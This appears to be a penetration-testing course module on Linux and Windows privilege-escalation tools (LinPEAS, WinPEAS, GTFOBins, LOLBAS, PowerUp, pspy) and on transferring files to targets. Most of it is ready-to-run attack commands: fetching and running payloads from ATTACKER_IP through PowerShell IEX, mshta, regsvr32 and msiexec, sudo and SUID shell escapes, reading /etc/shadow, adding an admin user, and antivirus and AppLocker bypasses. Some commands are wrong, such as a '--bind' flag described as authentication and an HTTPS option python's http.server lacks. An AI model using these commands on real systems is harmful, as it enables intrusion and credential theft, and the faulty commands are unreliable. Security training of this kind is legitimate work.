# 06.3 — PrivEsc Tools Reference

## The Tool Workflow

Manual enumeration builds situational awareness. Automated tools scale coverage so you don't miss anything.

**Workflow:**
```
1. Manual quick checks (id, sudo -l, SUID, crontab — 2 mins)
2. Transfer and run LinPEAS / WinPEAS (automated full scan)
3. Review output for highlighted findings
4. Cross-reference with GTFOBins / LOLBAS
5. Exploit
```

---

## LinPEAS — Linux Privilege Escalation Awesome Script

LinPEAS is the most comprehensive Linux privilege escalation enumeration script. It checks hundreds of vectors, colour-codes results by severity, and saves hours of manual work.

Red = critical / definitely check  
Yellow = interesting  
Green = configuration details

### Getting LinPEAS onto the Target

```bash
# Method 1 — download directly (if target has internet)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Method 2 — host on your machine, download on target
# Kali:
python3 -m http.server 80
# Target:
wget http://ATTACKER_IP/linpeas.sh
curl http://ATTACKER_IP/linpeas.sh -o linpeas.sh

# Method 3 — base64 encode and paste (no network access)
# Kali:
base64 -w 0 linpeas.sh
# Target (paste the output):
echo "BASE64_STRING" | base64 -d | sh

# Run LinPEAS
chmod +x linpeas.sh
./linpeas.sh

# Save output for review
./linpeas.sh | tee linpeas_output.txt
./linpeas.sh 2>/dev/null | tee linpeas_output.txt

# Run specific checks only
./linpeas.sh -s    # super fast (key checks only)
./linpeas.sh -P    # with pass scan (look for passwords in files)
./linpeas.sh -a    # all checks (slower)
```

### What LinPEAS Checks

LinPEAS covers 300+ checks including:

```
System Info
  → OS, kernel, hostname, env variables

Users & Groups
  → sudo permissions, interesting groups (docker, disk, lxd, adm)
  → Recently modified passwd/shadow

Software
  → Installed packages with known CVEs
  → SUID/GUID binaries
  → Capabilities

File Permissions
  → World-writable files and directories
  → Writable config files
  → /etc/passwd and /etc/shadow permissions
  → Credentials in config files

Network
  → Open ports, active connections
  → Hosts file, ARP table

Processes & Cron
  → Running processes (especially root processes)
  → Crontabs (system and user)
  → Interesting scripts being run

Possible Passwords
  → grep for passwords in common config locations
  → Bash history
  → SSH keys

Containers
  → Docker socket writable?
  → Running in a container?
  → LXD group membership
```

### Key Red Findings to Act On First

```
# Sudo (ALL) NOPASSWD
# SUID binary not in default list
# Writable /etc/passwd or /etc/crontab
# Cron running writable script as root
# cap_setuid on python/ruby/perl
# Docker group membership
# World-writable service file
```

## WinPEAS — Windows Privilege Escalation Awesome Script

WinPEAS is the Windows equivalent. Runs as an executable (winPEASx64.exe) or PowerShell script.

### Getting WinPEAS onto Target

```bash
# Download on Kali
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe
# Host it:
python3 -m http.server 80
```

```powershell
# Download on Windows target
certutil.exe -urlcache -split -f http://ATTACKER_IP/winPEASx64.exe C:\Temp\winpeas.exe
Invoke-WebRequest -Uri http://ATTACKER_IP/winPEASx64.exe -OutFile C:\Temp\winpeas.exe
(New-Object System.Net.WebClient).DownloadFile('http://ATTACKER_IP/winPEASx64.exe','C:\Temp\winpeas.exe')

# Run
C:\Temp\winpeas.exe

# Run specific module
C:\Temp\winpeas.exe systeminfo
C:\Temp\winpeas.exe applicationsinfo
C:\Temp\winpeas.exe servicesinfo
C:\Temp\winpeas.exe userinfo

# Save output
C:\Temp\winpeas.exe > C:\Temp\winpeas_output.txt

# PowerShell version (evades AV that blocks exe)
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/winPEASps.ps1')
```

### What WinPEAS Checks

```
System Info
  → OS version, patches (missing hotfixes)
  → Architecture, hostname, domain info
  → AV and EDR products

Users
  → Current user privileges and groups
  → Credential Manager
  → Registry credentials (Autologon)
  → SAM / SYSTEM accessibility

Applications
  → Installed software versions
  → Third-party software with known CVEs

Services
  → Unquoted service paths
  → Service binary permissions
  → Service registry ACL
  → Modifiable service configs

Scheduled Tasks
  → Tasks running as SYSTEM with writable scripts

Registry
  → AlwaysInstallElevated
  → Autologon credentials
  → UAC settings

Network
  → Open ports, active connections
  → Shares and their permissions
  → ARP / DNS cache

Files
  → Common credential files
  → Unattend.xml / sysprep files
  → PowerShell history
  → Web config files
  → SSH keys
```

### Key Red Findings

```
SeImpersonatePrivilege Enabled
AlwaysInstallElevated: 1
Unquoted service path with writable directory
Autologon credentials in registry
Unattend.xml with admin password
PowerShell history containing passwords
Writable service binary
```

## GTFOBins — Linux Binary Exploit Reference

GTFOBins (https://gtfobins.github.io) documents how to abuse Unix binaries for:
- Sudo privilege escalation
- SUID exploitation
- Shell escapes from restricted environments
- File read/write
- Reverse shells

### How to Use It

1. Find a binary via `sudo -l` or `find / -perm -4000`
2. Go to https://gtfobins.github.io
3. Search the binary name
4. Click the relevant category (Sudo, SUID, Shell, File Read, etc.)
5. Copy the command

### Most Impactful GTFOBins Entries

```bash
# vim — sudo escape
sudo vim -c ':!/bin/bash'
# SUID escape
/usr/bin/vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-p")'

# python3 — sudo
sudo python3 -c 'import os; os.system("/bin/bash")'
# SUID
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# find — sudo
sudo find . -exec /bin/bash \; -quit
# SUID
find . -exec /bin/bash -p \; -quit

# awk — sudo
sudo awk 'BEGIN {system("/bin/bash")}'

# less — sudo (shell escape from pager)
sudo less /etc/passwd
# Inside less: !/bin/bash

# nano — sudo (shell escape)
sudo nano
# Inside nano: Ctrl+R, Ctrl+X, then type: reset; sh 1>&0 2>&0

# tar — sudo (wildcard)
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# env — sudo
sudo env /bin/sh

# nmap — sudo (older versions)
sudo nmap --interactive
nmap> !sh

# ruby — sudo
sudo ruby -e 'exec "/bin/sh"'

# perl — sudo
sudo perl -e 'exec "/bin/sh";'

# node — sudo
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'

# docker — if in docker group (equivalent to root)
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# disk — if in disk group (raw disk access)
debugfs /dev/sda1
debugfs: cat /etc/shadow

# lxd — if in lxd group (container escape → root on host)
# (multi-step — see dedicated lxd privesc guide)
```

## LOLBAS — Living Off the Land Binaries and Scripts (Windows)

LOLBAS (https://lolbas-project.github.io) is the Windows equivalent of GTFOBins. Documents how to abuse legitimate Windows binaries for:
- Code execution
- File download
- File copy
- UAC bypass
- AMSI bypass

### Key LOLBAS Entries

```cmd
:: certutil.exe — download file (bypass proxy, AV often misses it)
certutil.exe -urlcache -split -f http://ATTACKER_IP/shell.exe C:\Temp\shell.exe
certutil.exe -decode encoded.b64 output.exe    :: base64 decode

:: bitsadmin.exe — download file
bitsadmin /transfer job /download /priority high http://ATTACKER_IP/shell.exe C:\Temp\shell.exe

:: mshta.exe — execute HTA (HTML Application) — code execution
mshta.exe http://ATTACKER_IP/evil.hta
mshta.exe javascript:a=(GetObject("script:http://ATTACKER_IP/payload.sct")).Exec();close();

:: regsvr32.exe — scriptlet execution (bypasses AppLocker)
regsvr32.exe /s /n /u /i:http://ATTACKER_IP/payload.sct scrobj.dll

:: wmic.exe — code execution
wmic process call create "cmd.exe /c C:\Temp\shell.exe"
wmic /node:192.168.1.1 /user:admin /password:pass process call create "cmd.exe"

:: rundll32.exe — DLL execution
rundll32.exe C:\Temp\malicious.dll,EntryPoint

:: powershell.exe — download and execute (classic)
powershell -exec bypass -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/shell.exe','C:\Temp\shell.exe')"
powershell -exec bypass -enc BASE64_ENCODED_COMMAND

:: installutil.exe — bypass AppLocker (whitelist bypass)
installutil.exe /logfile= /LogToConsole=false /U C:\Temp\malicious.exe

:: msiexec.exe — install remote MSI (code execution)
msiexec /q /i http://ATTACKER_IP/malicious.msi

:: odbcconf.exe — execute DLL via ODBCCONF
odbcconf.exe /a {REGSVR C:\Temp\malicious.dll}

:: expand.exe — copy files
expand \\ATTACKER_IP\share\tool.exe C:\Temp\tool.exe

:: forfiles.exe — execute command per file
forfiles /p C:\Windows\System32 /m notepad.exe /c "C:\Temp\shell.exe"
```

## PowerUp — Windows Privesc Automation (PowerShell)

PowerUp is a PowerShell script that checks for common Windows privesc misconfigurations.

```powershell
# Download and import
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')

# Run all checks
Invoke-AllChecks

# Specific checks
Get-UnquotedService          # unquoted service paths
Get-ModifiableServiceFile    # writable service binaries
Get-ModifiableService        # services with weak permissions
Get-RegistryAlwaysInstallElevated    # AlwaysInstallElevated
Get-RegistryAutoLogon        # autologon credentials in registry
Find-PathHijackLocality      # PATH hijack opportunities
Get-UnattendedInstallFile    # Unattend.xml files

# Auto-exploit unquoted service path
Write-ServiceBinary -Name 'VulnerableService' -Command "net localgroup administrators attacker /add"
Install-ServiceBinary -Name 'VulnerableService'
```

## pspy — Process Spy (Linux, No Root)

pspy monitors Linux processes **without root**. Watches for new processes being spawned — including cron jobs.

```bash
# Download
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64

# Run and watch
./pspy64

# Watch for:
# UID=0 (root) running processes
# Scripts being executed on a timer
# Commands with interesting arguments (passwords in CLI args)

# Filter output
./pspy64 | grep "UID=0\|root"

# Smaller version for 32-bit systems
./pspy32
```

Example output showing a root cron job:
```
2024/01/01 12:00:01 CMD: UID=0   PID=1337  | /bin/sh -c /opt/scripts/backup.sh
```
→ Find `/opt/scripts/backup.sh`, check if writable, append payload.

## Transferring Files to Targets

Getting tools onto the target is half the battle.

### Linux — Receiving Files

```bash
# wget
wget http://ATTACKER_IP/linpeas.sh

# curl
curl http://ATTACKER_IP/linpeas.sh -o linpeas.sh

# SCP (if SSH is available and you have creds)
scp attacker@ATTACKER_IP:/path/to/linpeas.sh .

# Netcat receive
nc -lvnp 9999 > linpeas.sh
# (send from attacker: nc TARGET_IP 9999 < linpeas.sh)

# Base64 encode (no network — paste into shell)
# Kali: base64 -w0 linpeas.sh
# Target: echo "..." | base64 -d > linpeas.sh && chmod +x linpeas.sh
```

### Windows — Receiving Files

```cmd
:: PowerShell DownloadFile
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/file.exe','C:\Temp\file.exe')"

:: PowerShell DownloadString (in-memory execution)
powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/script.ps1')"

:: certutil
certutil.exe -urlcache -split -f http://ATTACKER_IP/file.exe C:\Temp\file.exe

:: bitsadmin
bitsadmin /transfer job /download /priority high http://ATTACKER_IP/file.exe C:\Temp\file.exe

:: SMB share (Impacket smbserver on Kali — no auth)
sudo impacket-smbserver share . -smb2support
:: Windows target:
copy \\ATTACKER_IP\share\file.exe C:\Temp\file.exe

:: Base64 decode (no network)
:: Kali: cat file.exe | base64 -w0
:: Windows: powershell -c "[IO.File]::WriteAllBytes('C:\Temp\file.exe',[Convert]::FromBase64String('BASE64'))"
```

### Host Files from Kali

```bash
# Simple HTTP server (most common)
python3 -m http.server 80
python3 -m http.server 443    # alternative port

# With authentication
python3 -m http.server 80 --bind 0.0.0.0

# FTP (useful for older Windows targets)
python3 -m pyftpdlib -p 21 -w

# SMB (for Windows)
sudo impacket-smbserver share /path/to/files -smb2support

# HTTPS (if target enforces HTTPS)
sudo python3 -m http.server 443 --ssl --certfile cert.pem --keyfile key.pem
```

```bash
# Linux — full scan
./linpeas.sh | tee output.txt

```
